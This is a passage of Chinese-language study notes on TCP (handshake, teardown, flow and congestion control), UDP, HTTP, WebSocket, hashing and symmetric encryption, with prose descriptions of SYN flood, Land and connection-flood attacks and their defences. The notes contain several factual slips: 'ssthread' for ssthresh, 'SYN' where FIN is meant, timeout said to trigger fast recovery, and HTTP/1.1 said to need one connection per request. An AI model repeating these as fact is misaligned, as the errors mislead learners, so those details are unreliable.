<li><strong>CLOSING</strong>：当双方同时发送FIN报文时，客户端会在收到服务器的FIN报文前进入CLOSING状态。这表示双方都请求关闭连接，但客户端尚未收到服务器对其FIN报文的确认。</li>
<li><strong>LAST_ACK</strong>：服务器在发送FIN报文后，进入LAST_ACK状态。这表示服务器等待客户端对其FIN报文的确认。</li>
<li><strong>TIME_WAIT</strong>：客户端收到服务器的FIN报文并确认后，进入TIME_WAIT状态。客户端会在这个状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保服务器收到对其FIN报文的确认。之后，客户端进入CLOSED状态，关闭连接。</li>
<li><strong>CLOSED</strong>：连接已完全关闭，可以释放所有相关资源。</li>
</ol>
<p>这些状态描述了TCP连接的整个生命周期，包括连接建立、数据传输和连接关闭</p>
<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><h3 id="三次握手的过程"><a href="#三次握手的过程" class="headerlink" title="三次握手的过程"></a>三次握手的过程</h3><p>TCP三次握手（Three-Way Handshake）是建立TCP连接的过程，通过三次交换控制报文来确认双方的收发能力和同步双方的初始序列号。以下是TCP三次握手的详细步骤：</p>
<ol>
<li><p><strong>SYN</strong>：客户端发送一个TCP报文，其中SYN（Synchronize Sequence Numbers，同步序列号）标志位被设置为1，表示这是一个连接请求。客户端还会选择一个初始序列号x，并将其放入报文的序列号字段。</p>
</li>
<li><p><strong>SYN-ACK</strong>：服务器收到客户端的SYN报文后，会发送一个响应报文。在这个报文中，SYN标志位和ACK（Acknowledge，确认）标志位都被设置为1。服务器也会选择一个初始序列号y，并将其放入报文的序列号字段。同时，服务器会将客户端报文序列号x加1，并将结果放入报文的确认号字段，表示期望收到客户端下一个报文的序列号。</p>
</li>
<li><p><strong>ACK</strong>：客户端收到服务器的SYN-ACK报文后，会发送一个ACK报文。在这个报文中，ACK标志位被设置为1。客户端会将服务器报文的序列号y加1，并将结果放入报文的确认号字段，表示期望收到服务器下一个报文的序列号。至此，TCP三次握手完成，双方建立起了连接。</p>
</li>
</ol>
<p>在TCP三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号。</p>
<p>总之，TCP三次握手是建立TCP连接的过程，包括以下三个步骤：</p>
<ol>
<li>客户端发送SYN报文，请求连接，并设置初始序列号x。</li>
<li>服务器回复SYN-ACK报文，确认连接请求，设置初始序列号y，确认号为x+1。</li>
<li>客户端发送ACK报文，确认服务器的SYN-ACK，确认号为y+1。</li>
</ol>
<p>握手完成后，TCP连接建立，数据传输开始。</p>
<h3 id="三次而不是两次握手的原因"><a href="#三次而不是两次握手的原因" class="headerlink" title="三次而不是两次握手的原因"></a>三次而不是两次握手的原因</h3><p>TCP三次握手的主要目的是在不可靠的网络环境中实现可靠的连接建立。三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。这里详细说明为什么需要三次握手：</p>
<ol>
<li><p><strong>确认收发能力</strong>：通过三次握手，客户端和服务器可以确认对方的收发能力。首先，客户端发送SYN报文表示其具备发送能力；其次，服务器回复SYN-ACK报文表示其具备接收和发送能力；最后，客户端发送ACK报文表示其具备接收能力。这个过程确保了双方在连接建立后都能正常地收发数据。</p>
</li>
<li><p><strong>同步初始序列号</strong>：在TCP协议中，每个字节都有唯一的序列号。为了实现可靠的数据传输，客户端和服务器需要在建立连接时同步各自的初始序列号。在三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号，并在握手过程中交换这些序列号。这样，双方都能知道对方期望收到的第一个字节的序列号，从而为后续的数据传输做好准备。</p>
</li>
</ol>
<p>如果只进行两次握手，客户端和服务器之间的连接可能不可靠。例如，客户端发送SYN报文后，服务器回复SYN-ACK报文，但无法确认客户端是否具备接收能力。这可能导致服务器发送的数据无法被客户端正确接收，从而影响通信质量。因此，为了实现可靠的连接建立，TCP协议采用了三次握手的机制。</p>
<h3 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h3><p>SYN攻击（也称为TCP SYN泛洪攻击）是一种利用TCP协议三次握手机制进行的拒绝服务（DoS）攻击。攻击者向目标服务器发送大量伪造源IP地址的SYN报文，目的是消耗服务器的资源，使正常用户无法访问该服务器。以下是SYN攻击的详细过程：</p>
<ol>
<li>攻击者向目标服务器发送大量SYN报文，这些报文的源IP地址是伪造的。每个SYN报文都表示一个连接请求。</li>
<li>目标服务器收到SYN报文后，会为每个报文分配一个半连接（half-open connection），并回复SYN-ACK报文。由于源IP地址是伪造的，这些SYN-ACK报文无法到达真正的发送方。</li>
<li>目标服务器等待攻击者发送ACK报文以完成握手过程。然而，由于源IP地址是伪造的，ACK报文永远不会到达。目标服务器会在一定时间内保留这些半连接，直到超时。</li>
<li>攻击者持续发送大量伪造的SYN报文，导致目标服务器的资源耗尽，从而无法处理正常用户的连接请求。</li>
</ol>
<p>SYN攻击的危害在于它可以通过较少的资源（例如，较低的带宽和较少的报文）消耗大量服务器资源，从而实现拒绝服务的目的。防御SYN攻击的方法包括：</p>
<ol>
<li><strong>缩短超时时间</strong>：减少服务器等待ACK报文的时间，以便更快地释放半连接资源。</li>
<li><strong>增加半连接队列大小</strong>：增加服务器可以处理的半连接数量，以应对大量的SYN报文。</li>
<li><strong>SYN cookies</strong>：服务器在回复SYN-ACK报文时，使用一种称为SYN cookies的技术生成确认号，而不是分配半连接。当收到有效的ACK报文时，服务器可以通过确认号重新构建连接状态，从而避免为伪造的SYN报文分配资源。</li>
<li><strong>过滤伪造的IP地址</strong>：部署网络设备（例如防火墙和入侵检测系统）来识别并阻止伪造的IP地址，以减少SYN攻击的影响。</li>
</ol>
<p>尽管SYN攻击是一种比较古老的攻击方式，但它仍然具有一定的威胁。通过采用合适的防御措施，可以降低SYN攻击对服务器的影响。</p>
<h3 id="Land攻击"><a href="#Land攻击" class="headerlink" title="Land攻击"></a>Land攻击</h3><p>Land攻击是一种DoS（拒绝服务）攻击类型，这种攻击利用TCP&#x2F;IP协议的漏洞，通过发送伪造的数据包来使目标系统无法正常工作。Land攻击的特点是发送的数据包的源IP地址和目标IP地址相同，同时源端口和目标端口也相同。</p>
<p>Land攻击的过程如下：</p>
<ol>
<li>攻击者构造一个伪造的TCP数据包，将源IP地址和目标IP地址设置为目标系统的IP地址，同时将源端口和目标端口设置为相同的端口号。</li>
<li>攻击者发送这个伪造的数据包到目标系统。</li>
<li>目标系统在收到这个数据包后，由于源IP地址和目标IP地址相同，尝试与自身建立连接。这会导致目标系统的资源消耗，进而可能导致系统崩溃或无法响应其他合法请求。</li>
</ol>
<p>Land攻击在20世纪90年代是一种较为常见的攻击手段，但现在大部分操作系统和网络设备已经修复了相关漏洞，不再受此类攻击影响。然而，为了防止潜在的Land攻击，可以采取以下措施：</p>
<ol>
<li>更新操作系统和网络设备的软件，确保已修复相关漏洞。</li>
<li>配置防火墙和入侵检测系统（IDS）来识别并过滤伪造的数据包。</li>
<li>监控网络流量，以检测异常数据包和潜在的攻击行为。</li>
</ol>
<h3 id="Connection-Flood攻击"><a href="#Connection-Flood攻击" class="headerlink" title="Connection Flood攻击"></a>Connection Flood攻击</h3><p>Connection Flood攻击是一种拒绝服务（DoS）攻击类型，其主要目标是消耗目标服务器的连接资源，使其无法处理新的合法连接请求。这种攻击方法通常通过发送大量的连接请求或半打开的连接来实现。</p>
<p>在Connection Flood攻击中，攻击者通常采取以下步骤：</p>
<ol>
<li>攻击者向目标服务器发送大量的连接请求，可能使用合法或伪造的IP地址。</li>
<li>目标服务器在收到连接请求后，尝试为每个请求分配资源，以处理并维护这些连接。</li>
<li>随着连接数量的增加，目标服务器的资源逐渐耗尽，导致无法处理新的合法连接请求。</li>
</ol>
<p>Connection Flood攻击可能针对不同的协议和服务，例如HTTP连接泛洪、TCP连接泛洪或TLS&#x2F;SSL连接泛洪。</p>
<p>为了防御Connection Flood攻击，可以采取以下措施：</p>
<ol>
<li><strong>限制连接速率</strong>：为单个IP地址或子网设置连接速率限制，以防止攻击者短时间内发送大量连接请求。</li>
<li><strong>连接队列管理</strong>：优化连接队列策略，例如缩短超时时间、增加队列大小等，以提高服务器处理连接请求的能力。</li>
<li><strong>入侵检测和防御系统</strong>：部署入侵检测和防御系统（IDPS），以实时监测并阻止Connection Flood攻击。</li>
<li><strong>负载均衡</strong>：通过负载均衡技术将连接请求分发到多个服务器，以减轻单个服务器的压力，并提高整体服务的抗攻击能力。</li>
<li><strong>IP地址过滤</strong>：使用防火墙或其他安全设备过滤来自可疑或恶意IP地址的连接请求。</li>
<li><strong>应用层防御</strong>：针对特定服务或协议的攻击，例如HTTP或TLS&#x2F;SSL连接泛洪，可以使用Web应用防火墙（WAF）或其他应用层防御技术进行防护。</li>
</ol>
<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><h3 id="四次挥手的过程"><a href="#四次挥手的过程" class="headerlink" title="四次挥手的过程"></a>四次挥手的过程</h3><p>TCP四次挥手是TCP连接在传输完成后进行断开的过程。TCP（传输控制协议）是一种面向连接的协议，因此在数据传输完成后，需要通过一个四步过程来正常关闭连接。以下是TCP四次挥手的详细步骤：</p>
<ol>
<li><p><strong>第一次挥手</strong>：客户端向服务器发送一个FIN报文，表示客户端已经完成数据传输，请求关闭连接。此时，客户端进入FIN_WAIT_1状态。</p>
</li>
<li><p><strong>第二次挥手</strong>：服务器收到客户端发送的FIN报文后，会发送一个ACK报文确认客户端的FIN报文已收到。此时，服务器进入CLOSE_WAIT状态，而客户端收到ACK报文后进入FIN_WAIT_2状态。</p>
</li>
<li><p><strong>第三次挥手</strong>：当服务器完成数据传输后，也会向客户端发送一个FIN报文，表示服务器同意关闭连接。此时，服务器进入LAST_ACK状态。</p>
</li>
<li><p><strong>第四次挥手</strong>：客户端在收到服务器的 FIN 报文后，发送 ACK 报文确认并进入 TIME_WAIT 状态。服务器收到 ACK 报文后，立即关闭连接。2 倍 MSL（约 2 分钟）后，客户端关闭连接。</p>
</li>
</ol>
<h3 id="要有TIME-WAIT状态的原因"><a href="#要有TIME-WAIT状态的原因" class="headerlink" title="要有TIME_WAIT状态的原因"></a>要有TIME_WAIT状态的原因</h3><p> TIME_WAIT状态存在于TCP连接关闭过程中，具有几个重要的原因：</p>
<ol>
<li><p><strong>确保最后一个ACK报文被对方接收</strong>：在TCP四次挥手过程中，客户端发送最后一个ACK报文确认收到服务器的FIN报文。TIME_WAIT状态确保了这个ACK报文能够被服务器正确接收。如果服务器没有收到这个确认报文，它会重发FIN报文。此时，由于客户端仍处于TIME_WAIT状态，可以再次发送ACK报文进行确认。</p>
</li>
<li><p><strong>处理延迟的数据包</strong>：在TIME_WAIT状态期间，客户端可以处理可能延迟到达的数据包。这有助于确保连接关闭前的所有数据包都被正确处理，防止数据丢失或错误。</p>
</li>
<li><p><strong>防止旧连接数据包干扰新连接</strong>：TCP连接由源IP、目标IP、源端口和目标端口四元组唯一确定。在某些情况下，相同的四元组可能在短时间内被重新用于新的连接。TIME_WAIT状态可以防止旧连接中仍在网络中传输的数据包干扰新连接。客户端在TIME_WAIT状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保旧连接的数据包从网络中消失。</p>
</li>
</ol>
<p>总之，TIME_WAIT状态在TCP连接关闭过程中发挥了重要作用，它确保了最后一个ACK报文被接收、处理延迟数据包和防止旧连接数据包干扰新连接。这有助于维护TCP连接的可靠性和数据传输的完整性。</p>
<h3 id="关闭连接的需要四次挥手，而建立连接只要三次握手的原因"><a href="#关闭连接的需要四次挥手，而建立连接只要三次握手的原因" class="headerlink" title="关闭连接的需要四次挥手，而建立连接只要三次握手的原因"></a>关闭连接的需要四次挥手，而建立连接只要三次握手的原因</h3><p>三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。确认过程中间有一个合并的SYN和ACK，所以是三步。</p>
<p>关闭连接需要四次挥手，因为 TCP 是全双工的，双方需要独立地确认对方已经完成数据发送，服务端收到SYN时可能还不能关闭连接，不能合并ACK和FIN，所以是四步。</p>
<h2 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h2><h3 id="滑动窗口机制"><a href="#滑动窗口机制" class="headerlink" title="滑动窗口机制"></a>滑动窗口机制</h3><p>TCP协议使用以字节为单位的滑动窗口协议来控制字节流的发送</p>
<p> 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口前部的字节已经发送并且收到了确认，那么就将发送窗口向后滑动一定距离，直到第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口前部字节为已经接收到的字节，收到数据并发送确认后，就向后滑动接收窗口，直到接收窗口为0。  </p>
<h3 id="确认重传机制"><a href="#确认重传机制" class="headerlink" title="确认重传机制"></a>确认重传机制</h3><p>在TCP中，选择性重传的实现原理主要依赖于选择性确认（Selective Acknowledgment, SACK）机制。SACK是一种TCP扩展，其目的是改进TCP在数据包丢失的情况下的性能。它允许接收方在确认报文中指定已成功接收的不连续数据段，从而使发送方可以更精确地了解哪些报文段需要重传。</p>
<p>SACK是通过在TCP报文头部添加选项字段来实现的。以下是SACK实现的主要步骤：</p>
<ol>
<li>协商SACK：在TCP连接建立过程中，双方通过在SYN和SYN-ACK报文中包含SACK-permitted选项来表示支持SACK。</li>
<li>接收数据并生成SACK块：接收方在接收数据时，记录每个已成功接收的数据段的左边界和右边界，并按照顺序排列。接收方在发送确认报文（ACK）时，会在TCP头部选项字段中加入SACK选项。SACK选项包含一个或多个SACK块，每个SACK块表示一个已成功接收的不连续数据段范围（左边界和右边界）。</li>
<li>处理SACK报文并重传数据：发送方在收到包含SACK选项的确认报文后，会根据其中的信息判断哪些报文段需要重传。发送方只需要重传那些未被确认的报文段，而已成功接收的数据段不会被重传。</li>
</ol>
<h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>TCP维护了一个拥塞窗口（cwnd，congestion window），窗口大小是发送端可以往网络发送的不会产生网络阻塞的字节数</p>
<h3 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h3><h4 id="慢启动算法"><a href="#慢启动算法" class="headerlink" title="慢启动算法"></a><strong>慢启动算法</strong></h4><p>慢启动用于在TCP连接开始时cwnd从初始值1逐渐（指数级）增加数据发送速率和传输窗口大小。发送端为连接维护了一个慢启动阈值（ssthread，slow start thread），一旦慢启动超过了慢启动阈值，TCP就从慢启动切换到拥塞避免算法（线性增加）</p>
<ul>
<li>当cwnd &lt; ssthread，使用慢启动算法</li>
<li>当cwnd &gt; ssthread，使用拥塞避免算法</li>
<li>当cwnd &#x3D; ssthread，既可以使用慢启动算法，也可以使用拥塞避免算法</li>
</ul>
<h4 id="拥塞避免算法"><a href="#拥塞避免算法" class="headerlink" title="拥塞避免算法"></a>拥塞避免算法</h4><p>拥塞避免算法的思路是让cwnd缓慢增大，即每经过一个往返时间RTT就把发送方的cwnd加1</p>
<h4 id="快速恢复算法"><a href="#快速恢复算法" class="headerlink" title="快速恢复算法"></a><strong>快速恢复算法</strong></h4><p>如果发送方接收到3个或3个以上的重复确认时，就认为网络出现了拥塞，此时将启用快速恢复算法</p>
<p>当发生超时，不是进行慢启动，而是进行快速恢复，先将ssthread设为cwnd&#x2F;2，再将cwnd设为ssthread，然后执行拥塞避免算法</p>
<h4 id="快速重传算法"><a href="#快速重传算法" class="headerlink" title="快速重传算法"></a><strong>快速重传算法</strong></h4><p>如果发送方接收到3个或3个以上的重复确认（duplicate ACK）时，就认为前面发送的数据包已经丢失，立即重传这些数据包而不是等待超时重传，但是在重传之前会先执行快速恢复算法，以减轻网络拥塞</p>
<h2 id="粘包、拆包"><a href="#粘包、拆包" class="headerlink" title="粘包、拆包"></a>粘包、拆包</h2><p>TCP粘包和拆包是指在TCP传输过程中，发送方发送的多个小数据包被接收方合并成一个大数据包（粘包），或者一个大数据包被接收方拆分成多个小数据包（拆包）的现象。</p>
<p>造成TCP粘包和拆包的主要原因是TCP协议是面向流的，发送方和接收方之间没有明显的分界点，数据以字节流的形式进行传输。这就导致了发送方发送的多个小数据包可能会在接收方端被合并成一个大数据包，或者一个大数据包在传输过程中被拆分成多个小数据包。</p>
<p>为了避免TCP粘包和拆包现象，通常需要进行数据分包和数据拆包处理。数据分包是将待发送的数据按照固定大小的数据块进行分割，以便接收方能够正确接收数据。数据拆包则是将接收到的大数据包拆分成多个小数据包，以便上层应用程序能够正确处理数据。</p>
<p>常用的TCP粘包和拆包处理方式包括：</p>
<ol>
<li><p>固定长度分包：将数据按照固定长度进行分包，接收方按照相同的长度进行接收和处理。</p>
</li>
<li><p>在数据包头部增加数据长度信息：将数据长度信息添加到数据包头部，接收方根据长度信息进行接收和处理。</p>
</li>
<li><p>使用分隔符分包：将不同数据块之间加上特定的分隔符进行分包。</p>
</li>
<li><p>消息头+消息体：在消息头中增加消息体长度字段，接收方先接收消息头中的消息体长度字段，然后根据长度信息接收和处理数据</p>
</li>
</ol>
<p>通过这些处理方式，可以有效避免TCP粘包和拆包现象，保证数据传输的正确性和完整性。</p>
<h1 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h1><p>UDP（User Datagram Protocol）是一种无连接、不可靠的传输层协议，它以尽可能少的开销提供了一种面向事务的简单传输服务。相比于TCP协议，UDP协议不具备可靠性和流量控制机制，但是它具有传输速度快、数据包大小灵活等优势，在实时应用场景中得到广泛应用。</p>
<p>UDP协议的主要特点如下：</p>
<ol>
<li>无连接：UDP协议不需要进行连接建立和释放操作，直接向目标主机发送数据包即可，因此传输效率较高。</li>
<li>面向报文：UDP协议对应用层传递的报文既不合并也不拆分，以数据包为单位进行传输。</li>
<li>无流量控制：UDP协议不具备流量控制机制，发送方按照自己的速度发送数据包，而不考虑接收方的接收能力。</li>
<li>无拥塞控制：发送方可以按照自己的速度发送数据包，不会对网络拥塞状况进行检测。</li>
<li>无重传机制：在UDP协议中，如果某个数据包在传输过程中丢失或损坏，UDP协议不会进行重传，也不会通知发送方，是不可靠的。</li>
</ol>
<p>UDP协议在实时应用场景中得到广泛应用，如视频、语音、游戏等实时性要求较高的应用。由于UDP协议具有传输速度快、数据包大小灵活等优势，能够满足实时应用的要求，并且由于无连接、无可靠性等特点，使得实现简单，成本低廉。但是，也由于UDP协议不具备可靠性和流量控制机制，因此在需要数据传输的可靠性和稳定性的应用场景中，如文件传输、邮件等，通常使用TCP协议来保证传输的可靠性。</p>
<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>HTTP是明文传输的、无状态的（关闭后客户端和服务端都不会保留任何上一次连接的信息）</p>
<h2 id="短连接"><a href="#短连接" class="headerlink" title="短连接"></a>短连接</h2><p>短连接的特点：</p>
<ul>
<li>是HTTP&#x2F;1.0的默认方式，每次请求都需要重新建立连接，可能导致较高的开销。</li>
<li>由于连接频繁建立和关闭，服务器可能需要处理大量的连接请求。</li>
</ul>
<p>短连接的适用场景：</p>
<ul>
<li>不需要长时间维持连接的场景。</li>
<li>低频率请求</li>
</ul>
<h2 id="长连接"><a href="#长连接" class="headerlink" title="长连接"></a>长连接</h2><p>长连接的特点：</p>
<ul>
<li>是HTTP&#x2F;1.1的默认方式，允许客户端在一个连接上发送多个请求，而不必每次都重新建立连接。</li>
<li>减少了重新建立连接的开销</li>
<li>长连接可能会占用服务器资源，因为连接在使用完后不会立即关闭。</li>
</ul>
<p>长连接的适用场景：</p>
<ul>
<li>需要长时间维持连接的场景，如实时应用和高频通信。</li>
<li>高频率请求</li>
</ul>
<h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><p>在HTTP&#x2F;1.1中，每个请求和响应都需要单独的TCP连接。虽然HTTP&#x2F;1.1引入了长连接来减少连接开销，但在每个连接上仍然只能同时处理一个请求。这可能导致队头阻塞问题，即较慢的请求阻塞后续请求的处理。HTTP&#x2F;2通过多路复用解决了这个问题。</p>
<p>多路复用的特点：</p>
<ul>
<li>允许在单个TCP连接上同时发送和接收多个请求和响应</li>
</ul>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>HTTP 状态码（HTTP Status Codes）是服务器用于表示客户端请求结果的三位数字。状态码分为五类，各类状态码的含义如下：</p>
<p>1xx（信息响应）：请求已接收，继续处理。</p>
<p>2xx（成功）：请求已成功接收、理解和接受。</p>
<p>3xx（重定向）：需要后续操作才能完成请求。</p>
<p>4xx（客户端错误）：请求包含错误语法或无法完成。</p>
<p>5xx（服务器错误）：服务器在处理请求时发生错误。</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>100</td>
<td>Continue: 请求已接收，继续处理。</td>
</tr>
<tr>
<td>200</td>
<td>OK: 请求成功，服务器已经处理了请求并返回了所需数据。</td>
</tr>
<tr>
<td>201</td>
<td>Created: 请求成功并已创建了新资源。</td>
</tr>
<tr>
<td>202</td>
<td>Accepted: 请求已被接受，但尚未处理。</td>
</tr>
<tr>
<td>204</td>
<td>No Content: 请求成功，但无需返回任何内容。</td>
</tr>
<tr>
<td>300</td>
<td>Multiple Choices: 请求的资源有多个表示。</td>
</tr>
<tr>
<td>301</td>
<td>Moved Permanently: 请求的资源已被永久移动到新的 URL。</td>
</tr>
<tr>
<td>302</td>
<td>Found: 请求的资源临时移动到新的 URL。</td>
</tr>
<tr>
<td>303</td>
<td>See Other: 对于 POST 请求，资源的响应可以在另一个 URL 上找到。</td>
</tr>
<tr>
<td>304</td>
<td>Not Modified: 资源自上次请求以来未发生更改。</td>
</tr>
<tr>
<td>307</td>
<td>Temporary Redirect: 请求的资源临时移动到新的 URL。</td>
</tr>
<tr>
<td>308</td>
<td>Permanent Redirect: 请求的资源已被永久移动到新的 URL。</td>
</tr>
<tr>
<td>400</td>
<td>Bad Request: 请求格式错误或服务器无法理解请求。</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized: 请求需要认证。客户端应提供认证信息。</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden: 客户端没有权限访问所请求的资源。</td>
</tr>
<tr>
<td>404</td>
<td>Not Found: 服务器找不到请求的资源。</td>
</tr>
<tr>
<td>405</td>
<td>Method Not Allowed: 请求方法（GET、POST 等）对于所请求的资源不允许。</td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error: 服务器在处理请求时遇到内部错误。</td>
</tr>
<tr>
<td>501</td>
<td>Not Implemented: 服务器不支持请求所需要的功能。</td>
</tr>
<tr>
<td>502</td>
<td>Bad Gateway: 作为网关或代理角色的服务器从上游服务器接收到无效响应。</td>
</tr>
<tr>
<td>503</td>
<td>Service Unavailable: 服务器暂时无法处理请求（由于过载或维护）。</td>
</tr>
<tr>
<td>504</td>
<td>Gateway Timeout: 作为网关或代理角色的服务器未及时从上游服务器收到请求。</td>
</tr>
</tbody></table>
<h1 id="WebSockets"><a href="#WebSockets" class="headerlink" title="WebSockets"></a>WebSockets</h1><p>WebSocket是一种通信协议，它在单个TCP连接上提供了全双工通信，允许客户端和服务器同时发送和接收消息。。WebSocket协议旨在解决HTTP协议在实时通信场景中的局限性，如低延迟和服务器主动推送消息等。</p>
<p>WebSocket协议的主要特点如下：</p>
<ol>
<li><p>全双工通信：WebSocket允许客户端和服务器在同一时间通过一个连接进行双向通信，而不是像HTTP那样的请求-响应模式。这使得数据传输更加高效，延迟更低。</p>
</li>
<li><p>低延迟：由于WebSocket建立在一个持久的TCP连接上，并减少了传输数据所需的开销，因此在实时应用中具有更低的延迟。</p>
</li>
<li><p>服务器推送：WebSocket允许服务器主动向客户端推送消息，而无需客户端明确请求。这对于实时通知、聊天应用、在线游戏等场景非常有用。</p>
</li>
<li><p>兼容性：WebSocket协议在设计时考虑了与HTTP协议的兼容性，使用HTTP升级请求将普通的HTTP连接升级为WebSocket连接。这意味着WebSocket可以利用现有的HTTP基础设施，如代理服务器和负载均衡器。</p>
</li>
</ol>
<p>WebSocket的一些常见应用场景包括：</p>
<ul>
<li>实时消息传递和聊天应用</li>
<li>在线游戏</li>
<li>实时数据推送和更新，如股票行情、体育比分等</li>
<li>即时协作工具，如在线文档编辑、共享白板等</li>
<li>物联网（IoT）设备间的通信</li>
</ul>
<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p>哈希算法（Hash algorithm）是密码学领域中的一种重要技术，它将任意长度的输入数据（通常称为消息）映射到固定长度的输出（通常称为哈希值、摘要或指纹）。哈希算法具有许多实际应用，如数据完整性验证、消息认证、数字签名以及密码存储等。</p>
<p>一个优秀的哈希算法应具有以下特性：</p>
<ol>
<li>确定性：对于相同的输入，哈希算法总是产生相同的输出。</li>
<li>高效性：哈希算法应能快速地计算出输入数据的哈希值。</li>
<li>单向性（预映像抗性）：给定一个哈希值，计算出原始输入数据应是非常困难的。</li>
<li>二次预映像抗性：给定一个输入数据，找到另一个不同的输入，使其具有相同的哈希值，应该是非常困难的。</li>
<li>抗碰撞性：找到任意两个不同的输入，它们具有相同的哈希值，应该是非常困难的。</li>
<li>随机性：哈希值的输出应该看起来是随机的，即使对于相似的输入，它们的哈希值也应该有很大差异。</li>
</ol>
<p>在密码学中，常用的哈希算法有：</p>
<ol>
<li>MD5（Message Digest Algorithm 5）：MD5是一种广泛使用的哈希算法，产生128位（16字节）的哈希值。然而，由于已知的安全漏洞，如碰撞攻击，MD5不再被认为是安全的哈希算法。</li>
<li>SHA-1（Secure Hash Algorithm 1）：SHA-1是一种哈希算法，产生160位（20字节）的哈希值。与MD5类似，由于已知的安全漏洞，如碰撞攻击，SHA-1也不再被认为是安全的哈希算法。</li>
<li>SHA-2（Secure Hash Algorithm 2）：SHA-2是一种哈希算法族，包括SHA-256、SHA-512等，分别产生不同长度的哈希值（256bit、512bit等），比SHA-1和MD5更安全，是目前安全的、推荐使用的Hash算法。</li>
<li>SHA-3（Secure Hash Algorithm 3）：SHA-3是一种新的哈希算法族，包括SHA3-256、SHA3-512等。是安全的。</li>
</ol>
<h2 id="碰撞攻击"><a href="#碰撞攻击" class="headerlink" title="碰撞攻击"></a>碰撞攻击</h2><p>碰撞攻击（Collision attack）是一种针对哈希算法的攻击方法，其目标是找到两个不同的输入数据，它们具有相同的哈希值。理论上，一个理想的哈希函数应具有较高的抗碰撞性，即使计算能力非常强大，也应该很难找到具有相同哈希值的两个不同输入。</p>
<p>然而，在实际中，许多哈希算法（如MD5和SHA-1）已经被证明存在碰撞攻击的漏洞。这些漏洞使攻击者能够在相对较短的时间内找到具有相同哈希值的不同输入，从而破坏哈希算法的安全性。</p>
<p>碰撞攻击的成功可能导致以下安全问题：</p>
<ol>
<li>伪造数字签名：如果攻击者能够找到两个具有相同哈希值的不同文档，他们可以使一个文档的有效数字签名适用于另一个文档，从而实现伪造。</li>
<li>证书颁发伪造：攻击者可以利用碰撞攻击创建具有相同哈希值的伪造证书，从而破坏SSL&#x2F;TLS等安全通信协议的信任基础。</li>
<li>数据完整性损害：哈希函数通常用于检查数据的完整性，如下载文件的校验。如果攻击者能够创建具有相同哈希值的恶意文件，用户可能会在不知情的情况下下载和使用这些文件。</li>
</ol>
<p>为了防范碰撞攻击，密码学家和研究人员持续开发新的、更安全的哈希算法。例如，SHA-2和SHA-3系列哈希算法被认为比MD5和SHA-1更抗碰撞攻击。通过使用更安全的哈希算法，可以提高数据完整性、消息认证和数字签名等应用的安全性。</p>
<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><p>对称加密算法是密码学中的一种加密方法，它使用相同的密钥（称为秘密密钥）对数据进行加密和解密。由于加密和解密过程共享相同的密钥，这种算法被称为对称加密。对称加密算法通常比非对称加密算法更快，因为它们在计算上相对简单。然而，密钥管理和安全密钥分发可能是对称加密算法面临的挑战。</p>
<p>以下是一些著名的对称加密算法：</p>
<ol>
<li>DES（Data Encryption Standard）：DES是一种曾广泛使用的对称加密算法，它使用56位密钥对数据进行加密。安全性低（曾被破解），不建议使用DES进行加密。</li>
<li>3DES（Triple DES ）：3DES是DES的改进版本，通过对数据应用三次DES加密操作来增加安全性。尽管3DES比DES更安全，但它的加密速度较慢，并且已经有更安全、更高效的替代方案。</li>
<li>AES（Advanced Encryption Standard）：AES是现代对称加密算法的事实标准，支持128、192和256位密钥长度，安全性高且加密速度快。AES被广泛应用于各种安全场景，如文件加密、安全通信和网络安全等。</li>
<li>Twofish：Twofish是Blowfish算法的继任者，也是AES算法竞争过程中的一个候选算法。Twofish使用128位的块大小和可变长度的密钥（128、192或256位）。尽管它在安全性和效率方面表现良好，但它没有像AES那样被广泛采用。</li>
</ol>
<p>对称加密算法在许多密码学应用中都有广泛应用，如保护数据的机密性、安全通信和身份认证等。然而，它们的一个主要局限性是密钥管理和分发。在许多场景中，对称加密算法与非对称加密算法结合使用。在这种混合方法中，非对称加密算法用于安全地交换对称密钥，而对称加密算法则用于实际的数据加密和解密。这种组合利用了非对称加密算法在密钥管理和分发方面安全性高的优势，同时保留了对称加密算法在数据加密和解密方面的高效性。</p>
<h2 id="非对称密钥算法"><a href="#非对称密钥算法" class="headerlink" title="非对称密钥算法"></a>非对称密钥算法</h2><p>非对称密钥算法，又称公钥加密算法，是一种加密和解密过程中使用不同密钥的加密方法。在非对称加密算法中，通常有一对密钥，一个是公钥，另一个是私钥。公钥用于加密数据，而私钥用于解密数据。以下是实际中常用的非对称密钥算法：</p>
<ol>
